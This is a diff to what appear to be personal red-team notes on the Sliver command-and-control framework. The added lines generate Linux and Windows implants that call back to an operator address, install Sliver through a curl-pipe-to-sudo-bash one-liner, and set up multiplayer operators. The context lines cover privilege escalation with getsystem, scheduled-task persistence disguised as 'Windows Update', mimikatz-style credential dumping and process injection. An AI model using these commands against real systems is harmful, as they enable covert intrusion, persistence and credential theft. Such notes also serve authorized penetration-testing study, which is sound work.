@@ -15,7 +15,15 @@ generate --mtls 192.168.0.21 --save ./file.exe --os Windows
 	* used when trying to not be as noisy as a session
 * kill all beacons with `beacons -k`
 * to move from a beacon to a session, use the beacon and then use the command `interactive`
+Generate linux implant
+```
+generate --mtls <IP> --os linux 
+```
 
+Generate windows beacon
+```
+generate --mtls <IP> --os windows --format exe
+```
 ## Sessions
 * essentially a shell
 * If you land on a local-admin account use the `getsystem` to get a session
@@ -42,3 +50,15 @@ sharpersist -- -t schtask -c "C:\Windows\Tasks\malwarefile.exe" -n "Windows Upda
 	* will take compiled program on your laptop and inject
 * `sharpkatz` is mimikatz, should already be loaded in
 * `secinject` section mapping process injection
+
+Sliver install oneliner
+```
+curl https://sliver.sh/install|sudo bash
+sliver
+```
+
+Multiplayer
+```
+new-operator --name <name> --lhost <address of sliver server>
+multiplayer
+```
